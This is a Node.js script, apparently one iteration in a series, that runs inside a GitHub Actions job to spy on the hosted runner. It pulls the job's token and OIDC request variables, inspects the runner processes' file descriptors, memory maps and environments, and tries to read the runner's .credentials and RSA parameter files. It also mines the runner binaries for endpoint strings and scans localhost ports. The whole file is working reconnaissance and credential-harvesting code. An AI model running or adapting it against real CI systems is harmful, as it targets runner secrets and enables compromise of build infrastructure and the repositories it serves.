const https = require('https');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

// v24: Deep runner process inspection
// v23 found: Runner.Worker PID 2115, Runner.Listener PID 2096, hosted-compute-agent PID 2063
// All running as `runner` user — can we access their FDs, maps, and net connections?
// Also: read event.json, runner config files at correct path, runner file commands
// And: ACTIONS_RUNNER_RETURN_JOB_RESULT_FOR_HOSTED=1 endpoint

function run(cmd) {
  try { return execSync(cmd, { encoding: 'utf8', timeout: 8000 }).trim(); }
  catch(e) { return 'ERR: ' + (e.stderr || e.message || '').substring(0, 120).trim(); }
}

function readSafe(p, maxBytes) {
  try {
    const content = fs.readFileSync(p);
    if (content.length === 0) return '(empty)';
    return content.toString('utf8').substring(0, maxBytes || 500) + (content.length > (maxBytes || 500) ? '...(len=' + content.length + ')' : '');
  } catch(e) { return 'ERR: ' + e.message; }
}

async function main() {
  console.log('=== V24: Deep runner process + filesystem inspection ===');
  const RUNNER_TEMP = process.env.RUNNER_TEMP || '/home/runner/work/_temp';
  const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
  const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
  const OIDC_TOKEN = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';

  // Get actual PIDs from ps — don't trust pgrep
  const psOut = run('ps -eo pid,ppid,cmd --no-headers');
  const lines = psOut.split('\n');
  let workerPid = null, listenerPid = null, hcaPid = null, bashPid = process.ppid;
  for (const l of lines) {
    const m = l.trim().match(/^(\d+)\s+\d+\s+(.+)/);
    if (!m) continue;
    const pid = m[1]; const cmd = m[2];
    if (cmd.includes('Runner.Worker')) workerPid = pid;
    if (cmd.includes('Runner.Listener')) listenerPid = pid;
    if (cmd.includes('hosted-compute-agent')) hcaPid = pid;
  }
  console.log('Runner.Worker PID:', workerPid);
  console.log('Runner.Listener PID:', listenerPid);
  console.log('hosted-compute-agent PID:', hcaPid);
  console.log('bash parent PID:', bashPid);

  // === PART 1: Network connections (what are the runner processes connected to?) ===
  console.log('\n=== PART 1: Network connections ===');
  // ss shows all sockets with owning process
  console.log('[SS] TCP connections (all processes):');
  console.log(run('ss -tuanp 2>/dev/null | head -30'));
  // Also get the remote IP of the runner service connection
  console.log('[SS] TCP ESTABLISHED:');
  console.log(run('ss -tuanp 2>/dev/null | grep ESTAB | head -20'));

  // Look at Runner.Worker's network connections via /proc
  if (workerPid) {
    console.log('\n[NET] Runner.Worker TCP connections:');
    // /proc/PID/net/tcp shows TCP connections for this process's network namespace
    const tcpHex = run('cat /proc/' + workerPid + '/net/tcp 2>/dev/null | head -20');
    console.log(tcpHex);
    console.log('[NET] Runner.Worker network via ss filter:');
    console.log(run('ss -tuanp 2>/dev/null | grep "pid=' + workerPid + '"'));
  }

  // === PART 2: File descriptors of runner processes ===
  console.log('\n=== PART 2: Runner process file descriptors ===');
  for (const [name, pid] of [['Runner.Worker', workerPid], ['Runner.Listener', listenerPid], ['HCA', hcaPid]]) {
    if (!pid) { console.log('[FD] ' + name + ': PID not found'); continue; }
    const fds = run('ls -la /proc/' + pid + '/fd 2>/dev/null | head -30');
    if (!fds.startsWith('ERR:')) {
      console.log('[FD] ' + name + ' (PID ' + pid + ') open files:');
      console.log(fds);
    } else {
      console.log('[FD] ' + name + ' (PID ' + pid + '): NOT READABLE (' + fds + ')');
    }
  }

  // === PART 3: Memory maps of runner processes (look for credential files) ===
  console.log('\n=== PART 3: Memory maps (credential files) ===');
  for (const [name, pid] of [['Runner.Worker', workerPid], ['Runner.Listener', listenerPid]]) {
    if (!pid) continue;
    const maps = run('grep -E "json|cred|token|secret|key|hmac|sign|\.runner|config" /proc/' + pid + '/maps 2>/dev/null | head -20');
    if (!maps.startsWith('ERR:') && maps.length > 0) {
      console.log('[MAPS] ' + name + ' (PID ' + pid + ') interesting mapped files:');
      console.log(maps);
    } else {
      console.log('[MAPS] ' + name + ': no interesting maps / not readable');
    }
  }

  // === PART 4: Runner installation directory ===
  console.log('\n=== PART 4: Runner installation directory ===');
  const runnerBase = '/home/runner/actions-runner';
  console.log('[DIR] /home/runner/actions-runner/:');
  console.log(run('ls -la ' + runnerBase + ' 2>/dev/null'));
  console.log('[DIR] /home/runner/actions-runner/cached/:');
  console.log(run('ls -la ' + runnerBase + '/cached/ 2>/dev/null'));
  console.log('[DIR] /home/runner/actions-runner/cached/2.335.1/:');
  console.log(run('ls -la ' + runnerBase + '/cached/2.335.1/ 2>/dev/null | head -20'));

  // Read runner config files from the correct location
  const runnerConfigs = [
    runnerBase + '/.runner',
    runnerBase + '/cached/2.335.1/.runner',
    runnerBase + '/.credentials',
    runnerBase + '/cached/2.335.1/.credentials',
    runnerBase + '/.credentials_rsaparams',
    '/opt/hca/.runner',
    '/opt/hca/.credentials',
    runnerBase + '/cached/2.335.1/bin/.runner',
  ];
  for (const p of runnerConfigs) {
    const content = readSafe(p, 500);
    if (!content.startsWith('ERR:')) {
      console.log('[RUNNER_CONFIG] ' + p + ':');
      console.log(content);
    }
  }

  // Also look for .json config files in the runner directory
  console.log('[FIND] Config files in runner dir:');
  console.log(run('find ' + runnerBase + ' -maxdepth 3 -name "*.json" -o -name ".runner" -o -name ".credentials" -o -name "*.key" 2>/dev/null | head -20'));

  // === PART 5: hosted-compute-agent inspection ===
  console.log('\n=== PART 5: hosted-compute-agent inspection ===');
  console.log('[HCA] /opt/hca/:');
  console.log(run('ls -la /opt/hca/ 2>/dev/null'));
  console.log('[HCA] Files in /opt/hca/:');
  console.log(run('find /opt/hca -maxdepth 3 -type f 2>/dev/null | head -20'));
  // Read any config files
  const hcaConfigs = run('find /opt/hca -maxdepth 3 -name "*.json" -o -name "*.yaml" -o -name "*.conf" -o -name "*.env" 2>/dev/null | head -10');
  if (hcaConfigs && !hcaConfigs.startsWith('ERR:')) {
    for (const fp of hcaConfigs.split('\n').filter(Boolean).slice(0, 5)) {
      console.log('[HCA_CONFIG] ' + fp + ':');
      console.log(readSafe(fp, 400));
    }
  }
  // HCA env
  if (hcaPid) {
    const hcaEnv = run('cat /proc/' + hcaPid + '/environ 2>/dev/null | tr "\\0" "\\n" | grep -v "^$" | head -30');
    if (!hcaEnv.startsWith('ERR:') && hcaEnv.length > 0) {
      console.log('[HCA_ENV] hosted-compute-agent environment:');
      console.log(hcaEnv);
    } else {
      console.log('[HCA_ENV] NOT READABLE:', hcaEnv.substring(0, 100));
    }
  }

  // === PART 6: Read workflow event.json and file commands ===
  console.log('\n=== PART 6: Workflow context files ===');
  const eventJson = RUNNER_TEMP + '/_github_workflow/event.json';
  console.log('[EVENT] event.json:');
  console.log(readSafe(eventJson, 1000));

  // Read runner file commands
  const fileCommands = [
    RUNNER_TEMP + '/_runner_file_commands',
  ];
  console.log('[FILE_CMDS] _runner_file_commands/:');
  console.log(run('ls -la ' + RUNNER_TEMP + '/_runner_file_commands/ 2>/dev/null'));
  const fcFiles = run('find ' + RUNNER_TEMP + '/_runner_file_commands -type f 2>/dev/null');
  if (fcFiles && !fcFiles.startsWith('ERR:')) {
    for (const fp of fcFiles.split('\n').filter(Boolean)) {
      console.log('[FC] ' + fp + ':');
      console.log(readSafe(fp, 500));
    }
  }

  // Read the bash script wrapper
  const shFile = RUNNER_TEMP + '/' + run('ls ' + RUNNER_TEMP + ' | grep ".sh$" 2>/dev/null | head -1');
  if (shFile && !shFile.includes('ERR:')) {
    console.log('[BASH_SCRIPT] ' + shFile + ':');
    console.log(readSafe(shFile, 200));
  }

  // === PART 7: ACTIONS_RUNNER_RETURN_JOB_RESULT_FOR_HOSTED investigation ===
  console.log('\n=== PART 7: ACTIONS_RUNNER_RETURN_JOB_RESULT_FOR_HOSTED=1 endpoint ===');
  // Find what URL the runner uses to return job results
  // The runner posts back job results to a "job result" endpoint
  // Check for this in the runner binary strings
  console.log('[STRINGS] Job result URLs in runner binary:');
  console.log(run('strings /home/runner/actions-runner/cached/2.335.1/bin/Runner.Worker 2>/dev/null | grep -iE "job.result|return.result|complete|finish" | head -20'));
  console.log('[STRINGS] ResultForHosted URLs:');
  console.log(run('strings /home/runner/actions-runner/cached/2.335.1/bin/Runner.Worker 2>/dev/null | grep -iE "hosted|JobResult|ReturnJob" | head -10'));
  // Also search Runner.Listener
  console.log('[STRINGS] Broker/finish URLs in Runner.Listener:');
  console.log(run('strings /home/runner/actions-runner/cached/2.335.1/bin/Runner.Listener 2>/dev/null | grep -iE "broker|finish|complete|result|hosted" | head -20'));

  // === PART 8: What does Runner.Worker communicate with? ===
  // The Runner.Worker spawnclient uses args "142 145" — these look like file descriptor numbers
  console.log('\n=== PART 8: Runner.Worker spawnclient FD args ===');
  // The args "142 145" to spawnclient are likely the file descriptor numbers for the pipe
  // connecting Runner.Worker to Runner.Listener
  // Let's check what FD 142 and 145 are in the Runner.Worker process
  if (workerPid) {
    for (const fd of ['142', '145', '0', '1', '2', '3', '4', '5']) {
      const fdLink = run('readlink /proc/' + workerPid + '/fd/' + fd + ' 2>/dev/null');
      if (!fdLink.startsWith('ERR:') && fdLink.length > 0) {
        console.log('[WORKER_FD] fd[' + fd + '] → ' + fdLink);
      }
    }
  }

  // === PART 9: Cgroup and systemd service info ===
  console.log('\n=== PART 9: System context ===');
  console.log('[CGROUP] hosted-compute-agent cgroup:');
  console.log(run('cat /sys/fs/cgroup/system.slice/hosted-compute-agent.service/memory.pressure 2>/dev/null | head -3'));
  // List cgroup tasks (processes in HCA service)
  console.log('[CGROUP_TASKS] HCA service processes:');
  console.log(run('cat /sys/fs/cgroup/system.slice/hosted-compute-agent.service/cgroup.procs 2>/dev/null | head -20'));
  // General system info
  console.log('[SYS] /proc/version:');
  console.log(run('cat /proc/version 2>/dev/null'));
  // Check if we're in a container or VM
  console.log('[SYS] Container detection:');
  console.log(run('cat /proc/1/cgroup 2>/dev/null | head -5'));

  // === PART 10: Probe hosted-compute-agent for HTTP endpoints ===
  console.log('\n=== PART 10: HCA local HTTP endpoint probe ===');
  // hosted-compute-agent likely runs a local HTTP service for communication
  const { execSync: execSync2 } = require('child_process');
  // Find what ports hosted-compute-agent is listening on
  console.log('[HCA_PORTS] HCA listening ports:');
  console.log(run('ss -tuanlp 2>/dev/null | grep "pid=' + hcaPid + '"'));
  // Try common local ports
  const net = require('net');
  const checkPort = (port) => new Promise((r) => {
    const s = new net.Socket();
    s.setTimeout(200);
    s.on('connect', () => { s.destroy(); r(true); });
    s.on('timeout', () => { s.destroy(); r(false); });
    s.on('error', () => r(false));
    s.connect(port, '127.0.0.1');
  });
  const openPorts = [];
  for (const port of [80, 443, 8080, 8081, 8082, 9090, 9091, 2376, 2377, 5985, 8000, 8443, 50051, 7777, 9099, 9100]) {
    if (await checkPort(port)) openPorts.push(port);
  }
  console.log('[HCA_PORTS] Open localhost ports:', openPorts.join(', ') || 'none');

  // Try HTTP on any open ports
  for (const port of openPorts.slice(0, 3)) {
    const r = await new Promise((resolve) => {
      const req = require('http').request({ hostname: '127.0.0.1', port, path: '/', method: 'GET' },
        (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 200) })); });
      req.on('error', e => resolve({ status: 'ERR', body: e.message }));
      req.setTimeout(1000, () => { req.destroy(); resolve({ status: 'TIMEOUT', body: '' }); });
      req.end();
    });
    console.log('[HCA_HTTP] port ' + port + ':', r.status, '|', r.body.substring(0, 100));
  }

  console.log('\nDone.');
}

main().catch(e => console.log('Fatal:', e.message, e.stack));
